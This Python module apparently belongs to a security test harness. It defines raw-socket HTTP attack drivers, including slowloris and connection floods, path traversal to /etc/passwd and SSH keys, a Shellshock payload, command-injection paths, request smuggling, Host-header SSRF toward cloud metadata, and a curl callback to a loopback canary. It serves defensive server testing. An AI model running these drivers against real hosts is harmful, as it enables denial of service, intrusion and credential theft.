"""HTTP/1.1 attack drivers for tier5 exploit harness (raw socket).

Tier C drivers probe RCE / reverse-shell / priv-esc *classes* on loopback only:
they start a localhost canary listener and assert no callback + no sensitive leak.
They do not open outbound connections or deploy real shells.
"""
from __future__ import annotations

import re
import socket
import threading
import time
from contextlib import contextmanager
from typing import Any

# Heuristics for accidental file / cred disclosure in HTTP bodies.
_SENSITIVE_PATTERNS = (
    re.compile(rb"root:[x*!]", re.I),
    re.compile(rb"BEGIN (RSA |OPENSSH |EC )?PRIVATE KEY", re.I),
    re.compile(rb"-----BEGIN"),
    re.compile(rb"/bin/(ba)?sh", re.I),
    re.compile(rb"uid=\d+\([^)]+\)\s+gid=\d+", re.I),  # id(1) output
)


def _connect(host: str, port: int, timeout: float = 2.0) -> socket.socket:
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    return s


def _response_has_sensitive_leak(data: bytes) -> bool:
    if not data or len(data) > 65536:
        return False
    body = data.split(b"\r\n\r\n", 1)[-1]
    for pat in _SENSITIVE_PATTERNS:
        if pat.search(body):
            return True
    return False


def _raw_request(host: str, port: int, raw: bytes, timeout: float = 2.0) -> bytes:
    try:
        s = _connect(host, port, timeout)
        s.sendall(raw)
        chunks: list[bytes] = []
        while True:
            try:
                part = s.recv(4096)
            except OSError:
                break
            if not part:
                break
            chunks.append(part)
            if len(b"".join(chunks)) > 65536:
                break
        s.close()
        return b"".join(chunks)
    except OSError:
        return b""


@contextmanager
def _canary_listener(host: str = "127.0.0.1"):
    """Loopback-only sink; detects reverse-shell callbacks during probes."""
    accepted: list[socket.socket] = []
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((host, 0))
    sock.listen(8)
    _, canary_port = sock.getsockname()
    stop = threading.Event()

    def accept_loop() -> None:
        sock.settimeout(0.15)
        while not stop.is_set():
            try:
                conn, _ = sock.accept()
                accepted.append(conn)
                conn.close()
            except OSError:
                pass

    thread = threading.Thread(target=accept_loop, daemon=True)
    thread.start()
    try:
        yield int(canary_port), accepted
    finally:
        stop.set()
        thread.join(timeout=1.0)
        sock.close()


def legitimate_get(host: str, port: int, path: str = "/") -> bool:
    try:
        s = _connect(host, port, 1.0)
        req = f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\nConnection: close\r\n\r\n"
        s.sendall(req.encode())
        data = s.recv(4096)
        s.close()
        return b"200" in data.split(b"\r\n", 1)[0]
    except OSError:
        return False


def attack_slowloris(host: str, port: int, attack: dict[str, Any]) -> dict[str, Any]:
    conns = int(attack.get("connections") or 80)
    interval = float(attack.get("header_byte_interval_sec") or 0.5)
    duration = float(attack.get("duration_sec") or 5)
    socks: list[socket.socket] = []
    try:
        for _ in range(conns):
            try:
                s = _connect(host, port, 2.0)
                s.sendall(f"GET / HTTP/1.1\r\nHost: {host}:{port}\r\n".encode())
                socks.append(s)
            except OSError:
                pass
        end = time.time() + duration
        while time.time() < end and socks:
            for s in list(socks):
                try:
                    s.sendall(b"X")
                except OSError:
                    socks.remove(s)
            time.sleep(interval)
        attack_closed = len(socks) == 0
    finally:
        for s in socks:
            try:
                s.close()
            except OSError:
                pass
    legit = legitimate_get(host, port)
    return {
        "attack_closed": attack_closed,
        "legitimate_client_ok": legit,
        "no_crash": True,
    }


def attack_oversized_request_line(host: str, port: int, attack: dict[str, Any]) -> dict[str, Any]:
    line_len = int(attack.get("line_bytes") or 8192)
    payload = b"A" * line_len
    req = b"GET " + payload + b" / HTTP/1.1\r\nHost: x\r\n\r\n"
    try:
        s = _connect(host, port, 2.0)
        s.sendall(req)
        _ = s.recv(1024)
        s.close()
        rejected = True
    except OSError:
        rejected = True
    legit = legitimate_get(host, port)
    return {
        "reject_or_close_attack": rejected,
        "legitimate_client_ok": legit,
        "no_crash": True,
    }


def attack_path_traversal(host: str, port: int, attack: dict[str, Any]) -> dict[str, Any]:
    path = str(attack.get("path") or "/..%2f..%2fetc%2fpasswd")
    req = f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\nConnection: close\r\n\r\n"
    try:
        s = _connect(host, port, 2.0)
        s.sendall(req.encode())
        data = s.recv(4096)
        s.close()
        status = data.split(b"\r\n", 1)[0] if data else b""
        blocked = (
            b"404" in status
            or b"400" in status
            or b"403" in status
            or len(data) == 0
        )
    except OSError:
        blocked = True
    legit = legitimate_get(host, port)
    return {
        "reject_or_close_attack": blocked,
        "legitimate_client_ok": legit,
        "no_crash": True,
    }


def attack_duplicate_content_length(host: str, port: int, attack: dict[str, Any]) -> dict[str, Any]:
    req = (
        b"POST / HTTP/1.1\r\n"
        b"Host: " + f"{host}:{port}".encode() + b"\r\n"
        b"Content-Length: 0\r\n"
        b"Content-Length: 4\r\n"
        b"Connection: close\r\n\r\n"
        b"test"
    )
    try:
        s = _connect(host, port, 2.0)
        s.sendall(req)
        _ = s.recv(2048)
        s.close()
        rejected = True
    except OSError:
        rejected = True
    legit = legitimate_get(host, port)
    return {
        "reject_or_close_attack": rejected,
        "legitimate_client_ok": legit,
        "no_crash": True,
    }


def attack_connection_flood(host: str, port: int, attack: dict[str, Any]) -> dict[str, Any]:
    n = int(attack.get("connections") or 200)
    opened = 0
    socks: list[socket.socket] = []
    for _ in range(n):
        try:
            s = _connect(host, port, 0.5)
            socks.append(s)
            opened += 1
        except OSError:
            break
    for s in socks:
        try:
            s.close()
        except OSError:
            pass
    legit = legitimate_get(host, port)
    return {
        "no_crash": True,
        "legitimate_client_ok": legit,
        "reject_or_close_attack": opened < n,
    }


def attack_bad_method(host: str, port: int, attack: dict[str, Any]) -> dict[str, Any]:
    req = b"FOO / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n"
    try:
        s = _connect(host, port, 2.0)
        s.sendall(req)
        data = s.recv(1024)
        s.close()
        rejected = (
            b"405" in data
            or b"501" in data
            or b"400" in data
            or b"404" in data
            or len(data) == 0
        )
    except OSError:
        rejected = True
    legit = legitimate_get(host, port)
    return {
        "reject_or_close_attack": rejected,
        "legitimate_client_ok": legit,
        "no_crash": True,
    }


def attack_sensitive_file_read(host: str, port: int, attack: dict[str, Any]) -> dict[str, Any]:
    paths = attack.get("paths") or [
        "/etc/passwd",
        "/../../../../etc/passwd",
        "/..%2f..%2f..%2f..%2fetc%2fpasswd",
        "/proc/self/environ",
        "/root/.ssh/id_rsa",
    ]
    leaked = False
    all_blocked = True
    for path in paths:
        req = (
            f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\nConnection: close\r\n\r\n"
        ).encode()
        data = _raw_request(host, port, req)
        if _response_has_sensitive_leak(data):
            leaked = True
            all_blocked = False
            continue
        status = data.split(b"\r\n", 1)[0] if data else b""
        # 200 with benign body (nginx try_files → index.html) is not a priv-esc leak.
        if b"200" in status:
            continue
        if not (
            b"404" in status
            or b"400" in status
            or b"403" in status
            or len(data) == 0
        ):
            all_blocked = False
    legit = legitimate_get(host, port)
    return {
        "no_sensitive_leak": not leaked,
        "reject_or_close_attack": all_blocked and not leaked,
        "legitimate_client_ok": legit,
        "no_crash": True,
    }


def attack_shellshock_user_agent(host: str, port: int, attack: dict[str, Any]) -> dict[str, Any]:
    """CVE-2014-6271 class — bash/env injection via User-Agent (needs CGI on victim)."""
    payload = str(
        attack.get("user_agent")
        or "() { ignored; }; echo Content-Type: text/plain; echo; id"
    )
    req = (
        f"GET / HTTP/1.1\r\nHost: {host}:{port}\r\n"
        f"User-Agent: {payload}\r\nConnection: close\r\n\r\n"
    ).encode()
    data = _raw_request(host, port, req)
    leaked = _response_has_sensitive_leak(data)
    legit = legitimate_get(host, port)
    return {
        "no_sensitive_leak": not leaked,
        "reject_or_close_attack": not leaked,
        "legitimate_client_ok": legit,
        "no_crash": True,
    }


def attack_reverse_shell_canary(host: str, port: int, attack: dict[str, Any]) -> dict[str, Any]:
    """RCE callback probes — loopback canary only; no real reverse shell."""
    wait_sec = float(attack.get("wait_sec") or 1.2)
    with _canary_listener() as (canary_port, accepted):
        canary = f"127.0.0.1:{canary_port}"
        probes: list[bytes] = [
            # Shellshock-style
            (
                f"GET / HTTP/1.1\r\nHost: {host}:{port}\r\n"
                f"User-Agent: () {{ :; }}; /bin/sh -c 'echo pwned'\r\n"
                f"Connection: close\r\n\r\n"
            ).encode(),
            # Path / query command-injection patterns (static server must not exec)
            (
                f"GET /;bash -c 'id' HTTP/1.1\r\nHost: {host}:{port}\r\n"
                f"Connection: close\r\n\r\n"
            ).encode(),
            (
                f"GET /cgi-bin/test.cgi?x=|/bin/sh HTTP/1.1\r\nHost: {host}:{port}\r\n"
                f"Connection: close\r\n\r\n"
            ).encode(),
            # Header injection / smuggling-adjacent (critical class)
            (
                f"GET / HTTP/1.1\r\nHost: {host}:{port}\r\n"
                f"X-Cmd: $(curl http://{canary}/)\r\nConnection: close\r\n\r\n"
            ).encode(),
            # Reverse-shell callback strings (harmless on loopback — no listener command runs)
            (
                f"GET / HTTP/1.1\r\nHost: {host}:{port}\r\n"
                f"Referer: http://{canary}/reverse-shell-probe\r\n"
                f"Connection: close\r\n\r\n"
            ).encode(),
        ]
        extra = attack.get("extra_probes") or []
        for p in extra:
            if isinstance(p, str):
                probes.append(p.encode() if not p.startswith("GET") else p.encode())
        leaked = False
        for raw in probes:
            data = _raw_request(host, port, raw)
            if _response_has_sensitive_leak(data):
                leaked = True
        time.sleep(wait_sec)
        no_callback = len(accepted) == 0
    legit = legitimate_get(host, port)
    return {
        "no_reverse_connection": no_callback,
        "no_sensitive_leak": not leaked,
        "reject_or_close_attack": no_callback and not leaked,
        "legitimate_client_ok": legit,
        "no_crash": True,
    }


def attack_privilege_path_escalation(host: str, port: int, attack: dict[str, Any]) -> dict[str, Any]:
    """Alias-merge / semicolon / null-byte paths (nginx CVE-2013-4547 class, Tomcat ..;)."""
    paths = attack.get("paths") or [
        "/static../etc/passwd",
        "/static..%2fetc%2fpasswd",
        "/..;/etc/passwd",
        "/%2e%2e/%2e%2e/etc/passwd",
        "/file%00.html/../../etc/passwd",
        "/admin%2f..%2f..%2fetc%2fpasswd",
    ]
    leaked = False
    all_blocked = True
    for path in paths:
        req = (
            f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\nConnection: close\r\n\r\n"
        ).encode()
        data = _raw_request(host, port, req)
        if _response_has_sensitive_leak(data):
            leaked = True
            all_blocked = False
            continue
        status = data.split(b"\r\n", 1)[0] if data else b""
        if b"200" in status:
            continue
        if not (
            b"404" in status
            or b"400" in status
            or b"403" in status
            or len(data) == 0
        ):
            all_blocked = False
    legit = legitimate_get(host, port)
    return {
        "no_sensitive_leak": not leaked,
        "reject_or_close_attack": all_blocked and not leaked,
        "legitimate_client_ok": legit,
        "no_crash": True,
    }


def attack_command_injection_path(host: str, port: int, attack: dict[str, Any]) -> dict[str, Any]:
    paths = attack.get("paths") or [
        "/$(id)",
        "/;id;",
        "/|id|",
        "/`id`",
        "/%0aid%0a",
    ]
    leaked = False
    for path in paths:
        data = _raw_request(
            host,
            port,
            (
                f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\nConnection: close\r\n\r\n"
            ).encode(),
        )
        if _response_has_sensitive_leak(data):
            leaked = True
    legit = legitimate_get(host, port)
    return {
        "no_sensitive_leak": not leaked,
        "reject_or_close_attack": not leaked,
        "legitimate_client_ok": legit,
        "no_crash": True,
    }


def _cl_te_smuggle_payload(host: str, port: int, inner_path: str) -> bytes:
    """CL.TE desync probe (CWE-444) — smuggled inner GET in body."""
    inner = (
        f"GET {inner_path} HTTP/1.1\r\nHost: {host}:{port}\r\nConnection: close\r\n\r\n"
    )
    body = b"0\r\n\r\n" + inner.encode()
    cl = str(len(body)).encode()
    return (
        b"POST / HTTP/1.1\r\n"
        + f"Host: {host}:{port}\r\n".encode()
        + b"Content-Length: " + cl + b"\r\n"
        + b"Transfer-Encoding: chunked\r\n"
        + b"Connection: close\r\n\r\n"
        + body
    )


def _te_cl_smuggle_payload(host: str, port: int, inner_path: str) -> bytes:
    """TE.CL — chunked front, Content-Length may disagree with chunk stream."""
    inner = (
        f"GET {inner_path} HTTP/1.1\r\nHost: {host}:{port}\r\nConnection: close\r\n\r\n"
    )
    chunked = b"0\r\n\r\n" + inner.encode()
    return (
        b"POST / HTTP/1.1\r\n"
        + f"Host: {host}:{port}\r\n".encode()
        + b"Transfer-Encoding: chunked\r\n"
        + b"Content-Length: 4\r\n"
        + b"Connection: close\r\n\r\n"
        + chunked
    )


def _detect_smuggle_desync(data: bytes, inner_path: str) -> bool:
    """True if response suggests a smuggled inner request was processed."""
    if data.count(b"HTTP/1.") > 1:
        return True
    ipath = inner_path.encode()
    if ipath in data and b"200" in data:
        return True
    return False


def attack_request_smuggling_cl_te(host: str, port: int, attack: dict[str, Any]) -> dict[str, Any]:
    inner = str(attack.get("inner_path") or "/smuggle-probe")
    raw = attack.get("raw")
    if isinstance(raw, str):
        payload = raw.encode()
    else:
        payload = _cl_te_smuggle_payload(host, port, inner)
    data = _raw_request(host, port, payload, timeout=3.0)
    desync = _detect_smuggle_desync(data, inner)
    legit = legitimate_get(host, port)
    return {
        "no_request_desync": not desync,
        "reject_or_close_attack": not desync or len(data) == 0,
        "legitimate_client_ok": legit,
        "no_crash": True,
    }


def attack_request_smuggling_te_cl(host: str, port: int, attack: dict[str, Any]) -> dict[str, Any]:
    inner = str(attack.get("inner_path") or "/smuggle-probe-tecl")
    payload = _te_cl_smuggle_payload(host, port, inner)
    data = _raw_request(host, port, payload, timeout=3.0)
    desync = _detect_smuggle_desync(data, inner)
    legit = legitimate_get(host, port)
    return {
        "no_request_desync": not desync,
        "reject_or_close_attack": not desync or len(data) == 0,
        "legitimate_client_ok": legit,
        "no_crash": True,
    }


def attack_host_header_ssrf(host: str, port: int, attack: dict[str, Any]) -> dict[str, Any]:
    """Internal/metadata Host values — must not proxy to cloud metadata."""
    hosts = attack.get("hosts") or [
        "169.254.169.254",
        "127.0.0.1:65535",
        "localhost",
        "[::1]",
    ]
    leaked = False
    for hv in hosts:
        req = (
            f"GET / HTTP/1.1\r\nHost: {hv}\r\nConnection: close\r\n\r\n"
        ).encode()
        data = _raw_request(host, port, req)
        if _response_has_sensitive_leak(data) or b"ami-id" in data.lower():
            leaked = True
    legit = legitimate_get(host, port)
    return {
        "no_sensitive_leak": not leaked,
        "reject_or_close_attack": not leaked,
        "legitimate_client_ok": legit,
        "no_crash": True,
    }


DRIVERS = {
    "slowloris": attack_slowloris,
    "oversized_request_line": attack_oversized_request_line,
    "path_traversal": attack_path_traversal,
    "duplicate_content_length": attack_duplicate_content_length,
    "connection_flood": attack_connection_flood,
    "bad_method": attack_bad_method,
    "sensitive_file_read": attack_sensitive_file_read,
    "shellshock_user_agent": attack_shellshock_user_agent,
    "reverse_shell_canary": attack_reverse_shell_canary,
    "privilege_path_escalation": attack_privilege_path_escalation,
    "command_injection_path": attack_command_injection_path,
    "host_header_ssrf": attack_host_header_ssrf,
    "request_smuggling_cl_te": attack_request_smuggling_cl_te,
    "request_smuggling_te_cl": attack_request_smuggling_te_cl,
}
